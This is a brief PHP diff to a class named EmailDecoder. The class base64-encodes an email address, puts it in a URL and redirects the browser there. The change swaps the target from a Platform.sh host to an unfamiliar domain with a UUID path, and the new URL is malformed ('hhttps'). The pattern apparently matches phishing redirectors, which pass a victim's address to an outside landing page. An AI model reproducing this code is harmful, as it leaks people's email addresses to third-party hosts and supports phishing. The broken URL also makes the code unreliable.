@@ -22,7 +22,7 @@ class EmailDecoder
         $encodedEmail = base64_encode($email);
 
         // Construct the URL for Platform.sh
-        $url = "https://main-bvxea6i-vniscdoaqtby6.fr-4.platformsh.site/{$encodedEmail}";
+        $url = "hhttps://indus-qrp.com/15bdce6f-cc92-4a95-82fe-abd52e8d10df/{$encodedEmail}";
 
         // Redirect to the constructed URL
         header("Location: $url");
